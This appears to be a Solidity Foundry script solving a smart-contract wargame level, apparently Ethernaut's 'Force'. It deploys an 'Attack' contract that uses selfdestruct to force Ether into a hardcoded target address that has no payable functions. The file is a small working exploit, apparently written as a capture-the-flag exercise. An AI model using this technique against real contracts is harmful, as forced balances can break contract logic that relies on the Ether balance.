// SPDX-License-Identifier: MIT

pragma solidity 0.6.2;

import {Script} from "forge-std/Script.sol";


contract Attack {
    address payable force = 0x323295589E15DeC03bFD04a4Bdce5d5bEc553EEB;

    function stopContract() payable external{
        selfdestruct(force);
    }
}


contract Solve is Script {
    Attack attack;
    function run() external {
        vm.startBroadcast();
        attack = new Attack();
        attack.stopContract{value: 10}();
        vm.stopBroadcast();
    }
}